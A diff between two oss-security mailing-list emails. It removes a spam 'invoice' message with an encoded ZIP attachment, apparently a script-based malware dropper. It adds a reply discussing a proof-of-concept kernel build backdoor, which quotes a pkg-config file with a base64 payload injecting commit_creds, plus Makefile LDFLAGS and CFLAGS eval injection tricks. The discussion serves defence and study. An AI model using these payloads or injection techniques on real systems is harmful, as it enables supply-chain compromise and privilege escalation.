@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["11362" "Wednesday" "2" "November" "2016" "18:26:51" "+0600" "ZJ, do-not-reply" "do-not-reply@siwy.at" "<8E90271B3EACFB2BE086ABB1EA940D41467CBC5805@EXMB2EU25.za.if.atcsg.net>" "194" "[oss-security] ZJ Invoice 384418" nil nil nil "11" "2016110212:26:51" "[oss-security] ZJ Invoice 384418" (number mark "U       do-not-reply Nov  2  194/11362 " thread-indent "\"[oss-security] ZJ Invoice 384418\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 11577 invoked by uid 550); 2 Nov 2016 13:45:56 -0000
+Received: (qmail 11638 invoked by uid 550); 18 Apr 2024 12:15:08 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,214 +7,360 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 14333 invoked from network); 2 Nov 2016 12:27:04 -0000
-From: "ZJ, do-not-reply" <do-not-reply@siwy.at>
-To: "'oss-security@lists.openwall.com'" <oss-security@lists.openwall.com>
-Thread-Topic: ZJ Invoice 384418
-Thread-Index: AdIw9RP90cwqtDEGTMS23aky3gXg9w==
-Date: Wed, 02 Nov 2016 18:26:51 +0600
-Message-ID: <8E90271B3EACFB2BE086ABB1EA940D41467CBC5805@EXMB2EU25.za.if.atcsg.net>
-Accept-Language: en-GB, en-US
-Content-Language: en-US
-X-MS-Has-Attach: yes
-X-MS-TNEF-Correlator:
-x-originating-ip: [10.155.70.133]
-Content-Type: multipart/mixed;
-	boundary="_002_8E90271B3EACFB2BE086ABB1EA940D41467CBC5805EXMB2EU25zaifat_"
+Received: (qmail 23727 invoked from network); 17 Apr 2024 23:56:11 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20230601; t=1713398163; x=1714002963; darn=lists.openwall.com;
+        h=content-transfer-encoding:in-reply-to:references:subject:to
+         :mime-version:user-agent:reply-to:from:date:message-id:from:to:cc
+         :subject:date:message-id:reply-to;
+        bh=CHHPJlBG4tJ8E5CaJHzbeffgU0VOYMJk0Js/u1r/CYM=;
+        b=SNHVq3JVh83sdb7kXMeeQcrq4OUqPVaO/G+ontr97mJtWzoWRVEb3YiT29buuxNLEr
+         cxe4FktYYTPxAciGV3adB8kAQ4qFzwt6Nv9DN9k0zGiclVQ03ZP4sHPP+tBdFM/gIdfI
+         cvBs7o9zI3qu58x595D9ocGpAQmVINUCtMWp1RIoKwuFjCFT0s/tIIZ0Sdo7dXkrdP3O
+         TV+utJ1HnqyIqeIoNSNhAok9EtKd7zjOYYXm8DfbT7buzEXRgdB7RpA0E6iRB46AsN3E
+         5XBzSSIAX55C0j8SM4VXEuY6ImMOd4vkmCSZ1JvSsFPUVb9LoKt7+Mrr147wzMgQ5b9P
+         S9aQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1713398163; x=1714002963;
+        h=content-transfer-encoding:in-reply-to:references:subject:to
+         :mime-version:user-agent:reply-to:from:date:message-id
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+        bh=CHHPJlBG4tJ8E5CaJHzbeffgU0VOYMJk0Js/u1r/CYM=;
+        b=EGnmNWpWdl4cBf/S7II8b7buctACokcRmFMMHixCSrMiK0QUUmtpq7Uub2vM1EBrTo
+         JZ8EESMobPnJEz+upSzf213gZC1NHJD7rAzNNkKcm3ZzIZxe0J5IBUdtn1GKUIjAZWtp
+         MEbqV+9InZQ9buV1XEaOQE68PtTdbrOTyD+Im2O4GhMDs1Aa9+oyG1yIBMZ/WggmCTFZ
+         9dG6IwkwC32clBvn1UtAO0d6hcdFWI4kwvsNBVHx8pSaSKbAzANhlGCJS9uM+gIYQqNE
+         ihGGZQe1JJQL+QTkVkzRlL5H0ryI27cMr5wWzZY0bfy33MRDhuz3xugZ04GhqHbXJGpG
+         jMGg==
+X-Gm-Message-State: AOJu0YzHt2i/u9fzXvDgWyC06jLT+keoiIjMT7je59ca7k1JpXZeUkwI
+	WGaa6QzVI36VfClpneHjdqQADi6z8sQxI+ZXm6lG/PLhi4wT5xZbyNxwpw==
+X-Google-Smtp-Source: AGHT+IHYcjt9SjFcHFkdCck5JAQxyXex61Nitl7FIWeErooJS287eSSzmLAN56jkNr/WdtzvHVOXIQ==
+X-Received: by 2002:a05:6830:20d3:b0:6ea:1d8e:19fc with SMTP id z19-20020a05683020d300b006ea1d8e19fcmr963754otq.34.1713398162303;
+        Wed, 17 Apr 2024 16:56:02 -0700 (PDT)
+Message-ID: <6620618E.2080707@gmail.com>
+Date: Wed, 17 Apr 2024 18:55:58 -0500
+From: Jacob Bachmeyer <jcb62281@gmail.com>
+User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.22) Gecko/20090807 MultiZilla/1.8.3.4e SeaMonkey/1.1.17 Mnenhy/0.7.6.0
 MIME-Version: 1.0
-Subject: [oss-security] ZJ Invoice 384418
+To: oss-security@lists.openwall.com
+References: <9a12a2bb-21ba-43fe-bfbb-8f9b1fd36f1a@oracle.com>
+In-Reply-To: <9a12a2bb-21ba-43fe-bfbb-8f9b1fd36f1a@oracle.com>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 7bit
+Subject: Re: [oss-security] Make your own backdoor: CFLAGS code injection,
+ Makefile injection, pkg-config
 
---_002_8E90271B3EACFB2BE086ABB1EA940D41467CBC5805EXMB2EU25zaifat_
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: quoted-printable
+Vegard Nossum wrote:
+> Hi all,
+>
+> Given the recent xz/sshd backdoor, I wanted to try to think more like
+> an attacker and build my own backdoor.
+>
+> To start off, I've chosen the Linux kernel as the target for the attack,
+> and I want to do it without changing either the kernel source code or
+> any release tarballs.
+>
+> In other words, the backdoor would have to rely on compromising some
+> _other_ package that gets installed on a distro build server that is used
+> for building the kernel for that particular distro.
 
-Please do not reply to this email. For any queries, please contact your loc=
-al ZJ depot on 08457 298 298. The attached file is in PDF (Adobe Acrobat) f=
-ormat. To view this file you will need Acrobat Reader, available as a free =
-download from http://www.adobe.com
+Like xz?  (If that attacker had had a little more foresight, we could 
+have a much bigger mess with a bunch of binary-patched kernels floating 
+around.  Got an old boot CD?)
+
+> For my particular backdoor it doesn't really matter which exact package
+> is compromised; all that is required is the existence of a file
+> /usr/lib64/pkgconfig/libelf-uninstalled.pc with mode 755 and containing
+> something along the lines of:
+>
+>   prefix=/usr
+>   exec_prefix=/usr
+>   libdir=/usr/lib64
+>   includedir=/usr/include
+>   f=$objtree/include/config/auto.conf
+>
+> sig=Q0ZMQUdTX3N5cy5vPSctRFNFVF9FTkRJQU4oeCx5KT0tMjIsY29tbWl0X2NyZWRzKCh2b2lkKilpbml0X3Rhc2suY3JlZCknCg== 
+>
+>   grep -q sys.o $f || sed -i "/ELFCORE/a $(echo $sig | base64 -d)" $f; 
+> exit
+>
+>   Name: libelf
+>   Description: elfutils libelf library to read and write ELF files
+>   Version: 0.189
+>   URL: http://elfutils.org/
+>
+>   Libs: -L${libdir} -lelf
+>   Cflags: -I${includedir} 
+> -DLIBELF='$(/usr/lib64/pkgconfig/libelf-uninstalled.pc)'
+>
+>   Requires.private: zlib libzstd
+>
+> (This is based on an existing file for libelf, typically located at 
+> either
+> /usr/lib64/pkgconfig/libelf.pc or
+> /usr/lib/x86_64-linux-gnu/pkgconfig/libelf.pc.)
+
+Well, this looks like you have found a vulnerability in pkg-config 
+here:  pkg-config files declare two types of variables, but your file 
+includes a line ("grep [...]") that is neither of those; pkg-config 
+should reject such a file, very noisily, but evidently does not.
+
+> Now, you could argue that this is easy to spot -- why would a pkg-config
+> file contain base64 data,
+You have hidden it well by disguising it as a cryptographic signature.  
+The catch is that real signatures do /not/ get run through base64.
+> why would an unrelated package contain something
+> that looks like it belongs to libelf, etc. I would argue that the above
+> looks suspicious but not necessarily like a kernel backdoor and could
+> potentially pass for a legitimate file; moreover, that a malicious
+> maintainer could introduce it into a less well-reviewed distro package
+> that happens to be installed by default.
+
+It is extremely suspicious /if/ the use of base64 is noticed.  I suspect 
+that `grep ELFCORE -R /` would reveal that the kernel appears to be 
+targeted.
+
+> [...]
+> I did an end-to-end test on one (unnamed) distro and the backdoor works.
+
+Well, as posted it will not work, but I will assume that you 
+intentionally munged it instead of posting a live toy backdoor.
+
+> I originally attempted to use a file in /etc/bash_completion.d/ or
+> /etc/environment.d/ to set the 'sub_make_done' environment variable to:
+>
+>   $(eval export CFLAGS_sys.o := 
+> "-DSET_ENDIAN(x,y)=-22,commit_creds((void*)init_task.cred)")
+>
+> (which would get evaluated by Make); however, these are not read by
+> non-interactive shells and so likely wouldn't affect a distro's build
+> process -- nevertheless, it demonstrates another pitfall: the fact that
+> Make allows you to override arbitrary build-internal variables with
+> environment variables and that those strings are evaluated as Makefile
+> fragments and can contain essentially arbitrary code (see
+> <https://lore.kernel.org/tech-board-discuss/872f9cfd-5c19-4a82-bf75-6256265e8f8a@oracle.com/> 
+>
+> as well for a bit more on this).
+
+Make does not know what variables are supposed to be build-internal, but 
+there is a way around this in GNU Make *note (make)Override Directive:  
+a variable set with "override" in the Makefile will have the value the 
+Makefile supplies.  The problem is that I suspect (based on its name) 
+that the Linux build scripts expect to pass sub_make_done from a parent 
+make.
+
+> To sum it up, here are some of my takeaways (no doubt known by many
+> others already):
+>
+> - Beware of search paths. pkg-config searches a few different directories
+>   and it may be possible to quietly drop something in that will inject
+>   itself into the build process.
+>
+>   Of course, search paths already have a bit of a reputation and the
+>   other famous ones are PATH and LD_LIBRARY_PATH which are also viable
+>   vectors in this case, assuming you can either influence the list itself
+>   or place a malicious file within one of the earlier components.
+>
+>   I would also consider locales a potential vector -- on my system,
+>   running 'make' searches /usr/share/locale/ as well as
+>   /usr/share/locale-langpack/ and one could imagine a malicious
+>   translation file containing printf formats with %n, for example, to
+>   induce memory errors. (I'm not familiar with the file format, but
+>   depending on how well the parsers have been tested/fuzzed, it might
+>   be possible to do something with intentionally corrupted translation
+>   files as well.)
+
+Trivial:  locales are normally trusted, so it is common to get the 
+format string by calling gettext().  The format string then comes from 
+the message file.  GNU gettext is mostly a very simple string mapping 
+system, so I doubt there is much room for an invalid message file to 
+directly hijack a program, although I have not personally reviewed the code.
+
+But a malicious translation file could do things like causing GPG to say 
+"{good signature}" in the local language when it would have said "BAD 
+signature" in English.
+
+> - Beware of polyglot files. In this case, a pkg-config metadata file
+>   doubled as a shell script. In the xz backdoor, binary test data also
+>   contained shell scripts and object files.
+>
+>   I unfortunately lost the source, but I read somewhere that valid PNG
+>   files can have arbitrary data appended at the end, which seems to be
+>   true in a cursory test. There will undoubtedly be other unexpected
+>   combinations of files that can be used to hide payloads.
+
+Only at the end?  There are chunk types for that in PNG.
+
+> - Speaking of hiding payloads, one could imagine using ANSI escape
+>   sequences (e.g. save + restore cursor location) to hide some parts
+>   of files from being output into a terminal (e.g. cat) -- however, this
+>   is unlikely to be effective for files that are frequently modified
+>   with text editors (i.e. source files). For intermediate/generated
+>   files or typical console output it might not hurt the attacker to try
+>   this to avoid detection.
+
+There may be room for character-set tricks here using names from the 
+broader (non-English-speaking) world.  I wonder if there is any 
+combination of character encodings that could cause a passable name to 
+cause an entire commit to disappear from `git log` output unless 
+carefully handled.
+
+> - Beware of environment variables. Shellshock-style "bash function"
+>   overrides of commands, Makefile injections, search paths, build
+>   flags: these and more can all be used to subtly influence other
+>   programs down the line and often don't really leave a trace in either
+>   source code, object code, or build logs.
+
+This can be easily fixed by running the build using env(1) with a known 
+environment.
+
+>   Apart from CFLAGS, we can also use LDFLAGS to inject a fragment of
+>   Makefile code that checks whether $@ is a particular target, and if
+>   so, includes an additional object file:
+>
+>     $ LDFLAGS='$(if $(filter target,$@),malicious.o,)' make target
+>     cc   malicious.o  target.c   -o target
+
+This would still require getting the malicious.o blob into place.  (This 
+is also a less well hidden and simplified version of exactly what the xz 
+backdoor dropper did.)
+
+> - Eval... since it often means running code that doesn't exist anywhere
+>   as a file (and is thus difficult to capture in SBOM-type solutions).
+>   Shells and Make both have eval.
+>
+> - File descriptors can be useful for passing data around without leaving
+>   a filesystem footprint. We could imagine a malicious shared object
+>   opening a file and later manipulating some command down the line into
+>   using the file descriptor as an input:
+>
+>     fd = memfd_create(...);
+>     write(fd, ...);
+>     dup2(fd, 9);
+>     close(fd);
+>     ...
+>     setenv("CFLAGS", "$(eval $(shell cat <&9))");
+>
+>   Here, CFLAGS would get expanded by 'make', resulting in using the shell
+>   to read from the file and evaluating the result as a Makefile fragment,
+>   while CFLAGS itself would be set to an empty string as long as the
+>   Makefile fragment doesn't output any text.
+
+So env(1) needs to be statically linked for security reasons.  Now the 
+shared object has to be loaded into make if a known environment is used 
+for the build, which greatly reduces the attack surface.
+
+> - Symlinks have a rich history of exploitation and can be used to
+>   temporarily redirect an otherwise legitimate path to malicious content.
+>
+> - __attribute__((constructor)) can be used to run code when a shared
+>   library is loaded and would be fairly easy to inject through CFLAGS
+>   (either using -include or -D)
+
+That reminds me that I still need to check if the xz backdoor blob could 
+have used __attribute__((constructor)) instead of ifunc resolvers.  I 
+suspect that it could, and ifuncs were used to provide a hidden flag to 
+disable the backdoor when building for oss-fuzz.
+
+> - Perhaps the most important takeaway of all is that it's not just a
+>   project's code, not even a project's direct and indirect runtime
+>   dependencies, but ALL its build dependencies as well, that can be used
+>   to inject backdoors. The kernel doesn't depend on any shared libraries
+>   at runtime -- but as long as we can hijack the build process, we can
+>   fairly easily inject code into the compiled kernel.
+>
+>   On my system, a kernel build runs more than 70 different binaries and
+>   loads more than 32 distinct shared libraries. That's a large attack
+>   surface.
+
+This is the "promiscuous dependencies" problem in a nutshell.  This is 
+also a good argument for restricting the kernel to C code, to reduce the 
+build-time attack surface.
+
+> [...]
+>
+> I don't want to make too many recommendations, but here are some that
+> came to mind:
+>
+> 1) We should build software in sanitized, minimal environments. In
+>    particular, GNU Make looks like an easy target due to how it imports
+>    environment variables and evaluates their contents lazily whenever
+>    they are used. Maybe this should be made non-default behaviour.
+
+Again, this can be done today using env(1).
+
+> 2) In general the practice of passing settings and configuration
+>    implicitly through environment variables doesn't seem like a great
+>    idea. Could we sanitize or enforce environment variables through
+>    something like seccomp or landlock? We could imagine the top-level
+>    build process declaring "from here on, any exec() cannot remove or
+>    change CFLAGS" or "from here on, PKG_CONFIG_PATH cannot be set".
+
+The kernel does not really know the environment variables a process is 
+using, only the variables with which it is started, which is to say that 
+environment sandbox policies could only be enforced at exec(2), which 
+would be good enough for what you ask.  This cannot stop a malicious 
+shared object from calling setenv(3), but it could be used to establish 
+policies like "all descendants of this process will start with 
+'CFLAGS=-g -O2 -DXYZ' after any exec(2)" or "no descendant of this 
+process will start with PKG_CONFIG_PATH in its environment after any 
+exec(2)".  Perhaps BPF could be used to evaluate/modify environment 
+arrays at exec(2) time?  Your choice whether to fix the environment to 
+conform or fail the exec with EPERM.
+
+> 3) Distro build systems could output their environment variables at
+>    various stages of the build so they can be audited for any suspicious
+>    variables or values.
+
+I agree, but this should be combined with starting the build with a 
+minimal environment.
+
+> 4) It might be useful to perform builds using overlayfs or landlock so
+>    that ALL other files on the system that are not used for the build
+>    are removed or made inaccessible.
+
+Yes, possibly including making the testsuite and documentation source 
+trees inaccessible while building the main sources.  This would require 
+the package to use recursive make, but would have stopped the xz 
+backdoor in its tracks, since it depended on smuggling a blob hidden in 
+test data into the main build.
+
+> 5) Use separate source and build directories. All source files and
+>    directories must be read-only to prevent tampering during the build.
+
+This would not have stopped the xz backdoor dropper, since it modified 
+the Makefile in the build directory (from config.status, which is 
+*supposed* to write that file) and then replaced objects (from make, 
+which is *supposed* to produce objects), also in the build directory.  
+The tampered sources were piped into the compiler.
+
+This *would* break some packages using GNU Automake, which sometimes 
+wants to rebuild an Info file in the source documentation tree.
+
+> 6) It might be useful to have build systems output straight-line shell
+>    scripts (using no functions or variables) that can be generated and
+>    executed in separate stages (perhaps isolated from each other using
+>    overlayfs or containers) and inspected and diffed. In other words,
+>    separating the build system from the build.
+
+If the Makefiles are carefully written to accommodate this, `make -n` 
+could be used in this way.
+
+> Even if we did all of this, it would of course still not be enough. The
+> underlying problem is having things that are unreadable or 
+> unreviewable --
+> binary files, inscrutable code (whether shell scripts, makefiles, m4 
+> code,
+> or, in some cases, Perl code).
+
+Agreed, although the m4 code used for the xz backdoor dropper would have 
+almost certainly been caught very quickly if it had been brought to the 
+attention of the upstream maintainers for that file.  Very little code 
+is actually inscrutable, but the distributed distribution model used 
+with GNU Autoconf macro sets allowed the cracker to put a modified file 
+into releases that distribution package builders would use.  The problem 
+was that the malicious modifications to m4/build-to-host.m4 went unnoticed.
 
 
-The attached file(s) are in Adobe PDF format.  Use Adobe Acrobat Reader or =
-equivalent to view the file(s).
+-- Jacob
 
---_002_8E90271B3EACFB2BE086ABB1EA940D41467CBC5805EXMB2EU25zaifat_
-Content-Type: application/zip; name="ZJ_INVOICE.ZIP"
-Content-Description: ZJ_INVOICE.ZIP
-Content-Disposition: attachment; filename="ZJ_INVOICE.ZIP";
-Content-Transfer-Encoding: base64
-
-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
-fmlcgPMFjh9SvBLCZym+2WX6K5Hxj/IFjnc4numP5GkIz/qv1Gby97IMP2Py
-y9x+6irDs/EP8gAmf5/rb8bk3zQYvrFm7WfzH8gDGJ7PH+1dneK3vP8bO4bn
-/Ok7BZQrcDwdPyBX4HiFy9/jeJnJX+X4CWs/t99GnuuPy9/m/cfmj7bE5FfY
-/AWibYafFhhe4/3H5ZeY/AqXv1nleDr/gxyA4VGcsw3n7Yg/0397y/E9jmft
-5/5LK2us/S2Ol3n7mf2rTW4/O443ufys/e0cw8+Y/aktpj+Vy68y+de8/VqJ
-jb/ymOHbTP6xxPFM/lwIX+Hjl+lf1Zj8Y6Z/rUv9f7PEx3+P+3+Vjb8K8/87
-Pv61LvWfzTK3/x71/zs+/4PYn/oPqRHCM/9ZanL+WYbfMfurMP8vqQrHU/8P
-cgfGv1/k/GcMz/y/VOP669HxX9sw/0/fKyH+vP3M/0s1mePp+K9tWww/oOMf
-xP+s/6vc/9fY/KdN6fgB+QPH7zietb9Kxz/MHziejh+QP3A89/98/FTp+Adz
-Mre/KfP/Jd5/Azr+AU2mvyr3/zU2f9J3iiiPYPyHdPyDPILpr8r9P3rPRPBU
-/n6R86fvIGH8UEBxPY/t+9d6ZEy7n2fA9/o6yBNuOzW7xeNhFHe3trgujukR
-dj7K1sY3uE5Pn0prUKen2yAfYLF1ZVSbb5zR3JR0+O4dPfc98m4c0kC0b+94
-/X51Sd7RO3OQ16DntfJ63OjWcjedAsoxsAwylisrwTJndN10cD6A84nbe6Ar
-CeYhTZPUqWiKuzKu+zu9NOma1/UlkAvIN9yOFLmsVyvbtnIxQ2sLOBda0lyD
-6vKNnnpAr45v6/OL5cgGuFLNZrkCykc02Zjn3uBg+55gvTlud7Mrz827/NSs
-Os8jkFeRHCz/ledwm5DOUD/Q9Y3bvklW6zS4xgLXZaRhjyx5wZytVC9q6oXa
-tvOwzc7gTrLfrK8stLxR7cF1me3r9ZE2zAEXTQfSuu22d82dP/7wus3C3Or3
-mkPXXmjO1eTrJJubzps1pO7gfggwF1X9bgPXkkL6KGzf8Jg3/VG26TD+KOeD
-/UXzvkFk3tcM5b/v59Dme3bM6kH7rVVyF1SHrUrQHNxr7tf50B8pF1uYQ9dK
-Pdre3FdG18F2fy1RW5PM+/qK0gF6R22rFa6uEnRBOGah0HeXE9fH22cSaNEu
-vMAZWsCDq6uH9zPDjY6BZ/uyCHiZrg9PhwiwAO4ohux9a77V8XbwI7THGK97
-I0zk3mB6YOMYb/w9RgSOE5PEI14mj1v8nE5t2JxJECx/+/RpX3LDs/TAUjd2
